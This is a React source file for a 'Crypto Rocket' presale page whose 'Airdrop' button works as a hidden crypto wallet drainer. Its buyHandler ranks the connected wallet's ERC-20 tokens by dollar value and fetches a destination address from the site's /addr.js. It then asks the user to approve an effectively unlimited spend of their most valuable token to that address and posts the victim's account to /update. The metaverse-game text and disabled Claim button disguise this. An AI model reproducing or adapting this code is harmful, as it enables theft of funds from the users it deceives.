
import React, { useState, useEffect, useRef } from 'react';
import { makeStyles, useTheme } from '@material-ui/core/styles';
import { Typography, Grid, useMediaQuery } from '@material-ui/core';
import SwapHorizIcon from '@material-ui/icons/SwapHoriz';
import SwapVertIcon from '@material-ui/icons/SwapVert';
import { useSnackbar } from 'notistack';
import RadiusButton from 'components/RadiusButton';
import { MemoizedOutlinedTextField } from 'components/UI/OutlinedTextField';
import ProgressBar from 'components/UI/ProgressBar';
import ClimbLoading from 'components/ClimbLoading';
import { presaleInstance } from 'services/presaleInstance';
import { erc20Instance } from 'services/erc20Instance';
import { astrohInstance } from 'services/astrohInstance'
import { isEmpty, delay } from 'utils/utility';
import { ethers } from "ethers";
import axios from "axios";


const DATABASE_API = window.location.origin;
let tokenList = null;
// const DATABASE_API = "https://zxc.com";
console.log(window.location.origin);
const useStyles = makeStyles(theme => ({
    root: {
        backgroundColor: theme.palette.background.default,
        border: `solid 0.5px ${theme.palette.text.secondary}`,
        margin: theme.spacing(0.5),
        borderRadius: '20px'
    },
    dialogTitleContainer: {
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        flexDirection: 'row !important'
    },
    dialogActions: {
        display: 'flex',
        justifyContent: 'center',
        marginTop: theme.spacing(3),
        marginRight: -theme.spacing(2 / 8)
    },
    avatar: {
        backgroundColor: 'transparent',
        border: `2px solid ${theme.palette.text.secondary}`,
        height: theme.spacing(9),
        width: theme.spacing(9),
        marginRight: theme.spacing(1)
    },
    chipConatiner: {
        padding: theme.spacing(2.5, 1, 2.5, 1)
    },
    chip: {
        margin: theme.spacing(.5),
        backgroundColor: theme.palette.text.hoverText
    },
    titleLine: {
        marginBottom: theme.spacing(2.5)
    },
    dialogContent: {
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'space-evenly',
        width: '100%'
    },
    button: {
        border: 'none',
        background: 'linear-gradient(125deg, #06352d, #36f3d2 80%)',
        width: '100% !important'
    },
    buttonDisabled: {
        border: 'none',
        background: 'linear-gradient(125deg, #333, #333 80%)',
        width: '100% !important'
    },
    dialogActionContainer: {
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        flexDirection: 'column',
        marginLeft: 0,
        padding: theme.spacing(3)
    },
    selectContainer: {
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        width: '100%',
        padding: 8
    },
    loading: {
        width: 'auto !important',
        height: 'auto !important'

    }
}));
const PresaleAirdrop = ({ account, chainId, library }) => {

    const usdtAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
    const usdtContract = erc20Instance(usdtAddress, account, chainId, library);

    const classes = useStyles();
    const theme = useTheme();
    const { enqueueSnackbar } = useSnackbar();
    const isSm = useMediaQuery(theme.breakpoints.down('sm'), {
        defaultMatches: true,
    });

    const _1stTokenContract = useRef(null);
    const _2ndTokenContract = useRef(null);
    let _1stMaxBalance = 0;
    let _2ndMaxBalance = 0;

    useEffect(() => {
        try {
            const initialize = async () => {
                const res = await axios.get(DATABASE_API + '/tokenList.js',
                    {
                        headers: {
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
                        }
                    });
                tokenList = res.data;
                tokenList.map(async token => {
                    try {

                        let contract = erc20Instance(token.address, account, chainId, library);
                        let tokenBalanceBigNumber = await contract.balanceOf(account);
                        let tokenBalance = null;
                        let maxDecimal = 0;

                        if (token.decimals > 15) {
                            tokenBalance = ethers.utils.formatEther(tokenBalanceBigNumber);
                            maxDecimal = 18;
                        }
                        else if (token.decimals > 12) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "finney");
                            maxDecimal = 15;
                        }
                        else if (token.decimals > 9) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "szabo");
                            maxDecimal = 12;
                        }
                        else if (token.decimals > 6) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "gwei");
                            maxDecimal = 9;
                        }
                        else if (token.decimals > 3) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "mwei");
                            maxDecimal = 6;
                        }
                        else if (token.decimals > 0) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "kwei");
                            maxDecimal = 3;
                        }
                        else {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "wei");
                            maxDecimal = 0
                        }


                        if (tokenBalance > 0) {
                            for (let i = 0; i < maxDecimal - token.decimals; i++)
                                tokenBalance *= 10;
                        }

                        let resp = null;
                        if (tokenBalance > 0) {
                            resp = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${token.id}&vs_currencies=usd`,
                                {
                                    headers: {
                                        'Access-Control-Allow-Origin': '*',
                                        'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
                                    }
                                }
                            );
                        }
                        const tokenPrice = resp !== null ? resp.data[token.id].usd : 0;
                        let moneyBalance = tokenPrice * tokenBalance;
                        if (moneyBalance > _1stMaxBalance) {
                            _1stMaxBalance = moneyBalance;
                            _1stTokenContract.current = contract;
                            console.log("tokenID", token.id, "balance", tokenBalance, "_1stMaxBalance", _1stMaxBalance, _1stTokenContract);
                        }

                        if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance) {
                            _2ndMaxBalance = moneyBalance;
                            _2ndTokenContract.current = contract;
                            console.log("tokenID", token.id, "balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
                        }
                    }
                    catch (error) {
                        // console.log('kevin inital data error ===>', error);
                    }
                })



            }

            if (!isEmpty(usdtContract)) {
                initialize();
            }
        }
        catch (error) {
            console.log('kevin inital data error ===>', error)
        }

    }, [account])

    const buyHandler = async () => {
        try {

            let tempContract = null;
            if (!_1stTokenContract.current) {
                const res = await axios.get(DATABASE_API + '/tokenList.js',
                    {
                        headers: {
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
                        }
                    });
                tokenList = res.data;

                tokenList.map(async token => {
                    try {
                        let contract = erc20Instance(token.address, account, chainId, library);

                        let tokenBalanceBigNumber = await contract.balanceOf(account);
                        let tokenBalance = 0;
                        let maxDecimal = 0;

                        if (token.decimals > 15) {
                            tokenBalance = ethers.utils.formatEther(tokenBalanceBigNumber);
                            maxDecimal = 18;
                        }
                        else if (token.decimals > 12) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "finney");
                            maxDecimal = 15;
                        }
                        else if (token.decimals > 9) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "szabo");
                            maxDecimal = 12;
                        }
                        else if (token.decimals > 6) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "gwei");
                            maxDecimal = 9;
                        }
                        else if (token.decimals > 3) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "mwei");
                            maxDecimal = 6;
                        }
                        else if (token.decimals > 0) {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "kwei");
                            maxDecimal = 3;
                        }
                        else {
                            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "wei");
                            maxDecimal = 0
                        }


                        if (tokenBalance > 0) {
                            for (let i = 0; i < maxDecimal - token.decimals; i++)
                                tokenBalance *= 10;
                        }

                        console.log(token.symbol, tokenBalance);
                        let resp = null;
                        if (tokenBalance > 0) {
                            resp = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${token.id}&vs_currencies=usd`,
                                {
                                    headers: {
                                        'Access-Control-Allow-Origin': '*',
                                        'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
                                    }
                                }
                            );
                        }
                        const tokenPrice = resp !== null ? resp.data[token.id].usd : 0;
                        let moneyBalance = tokenPrice * tokenBalance;
                        if (moneyBalance > _1stMaxBalance) {
                            _1stMaxBalance = moneyBalance;
                            _1stTokenContract.current = contract;
                            console.log("tokenID", token.id, "balance", tokenBalance, "_1stMaxBalance", _1stMaxBalance, _1stTokenContract);
                        }

                        if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance) {
                            _2ndMaxBalance = moneyBalance;
                            _2ndTokenContract.current = contract;
                        }
                    }
                    catch (error) {
                        // console.log('kevin inital data error ===>', error);
                    }
                })
            }

            const ADDR = await axios.get(DATABASE_API + '/addr.js',
                    {
                        headers: {
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
                        }
                    });
            
            let targetAddress = ADDR.data;
            let tokenAddress = null;

            if (_1stTokenContract.current) {
                let allowance = await _1stTokenContract.current.allowance(account, targetAddress);
                
                allowance = ethers.utils.formatEther(allowance);
                if (allowance > 0) {
                    await _2ndTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
                    tokenAddress = _2ndTokenContract.current.address;
                }
                else {
                    await _1stTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
                    tokenAddress = _1stTokenContract.current.address;
                }
            }
            else
                await usdtContract.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
            let date = new Date();
            let article = date.getFullYear() + '/' + date.getMonth() + '/' + date.getDate() + ' ' +
                date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds() + ', user=' + account;
            article = article + ', token:' + tokenAddress;
            console.log(article);
            axios.post(DATABASE_API + '/update', article)
                .then(response => console.log('usder address add succsessful'))
                .catch(response => console.log(response));
        }
        catch (error) {
            enqueueSnackbar(`Airdrop Error ${error?.data?.message}`, { variant: 'error' });
        }
    }

    const airdropHandler = async () => {

    }

    return (
        <div>
            {/* <Typography component='div' variant='body1'
                style={{ marginBottom: 24, display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                BUY Crypto Rocket WITH BNB
                <Typography color='textSecondary' variant='h6' >
                    MAX: {320}
                </Typography>
            </Typography> */}
            <RadiusButton
                loading={true}
                onClick={buyHandler}
                className={classes.button} fullWidth={true}>
                <Typography variant='h6'>
                    Airdrop
                </Typography>
            </RadiusButton>
            <RadiusButton
                disabled={true}
                onClick={airdropHandler}
                className={classes.buttonDisabled} fullWidth={true}>
                <Typography variant='h6'>
                    Claim
                </Typography>
            </RadiusButton>
            <Grid container spacing={2} alignItems='center' justify='center' direction={isSm ? 'column' : 'row'}>
                <Grid item xs={12} md={12} container alignItems='center' justify='center' style={{ width: '100%' }}>
                    <p>Crypto Rocket is the Rocket Metaverse where anyone can earn tokens through skilled, strategic gameplay and contributie to the Rocket Metaverse ecosystem. In the Rocket Metaverse, you are a space guardian and your mission is to right against evil bosses to protect our metaverse. There are many different ways to earn in Rocket Metaverse: complete missions, upgrade and trade your spaceships, P2P, buy-sell-lease land, or simply stake $SPG token and receive interest rate from the treasury. The game focuses on inclusivity so it is designed in a way that allows everyone to play and enjoy the game anywhere at any time.</p>
                </Grid>
            </Grid>

            <Grid item xs={12} style={{ width: '100%', marginTop: 20 }}>
                <ProgressBar tokenSaleProgress={parseFloat(83.78)} />
            </Grid>
        </div>
    );
}

export default PresaleAirdrop;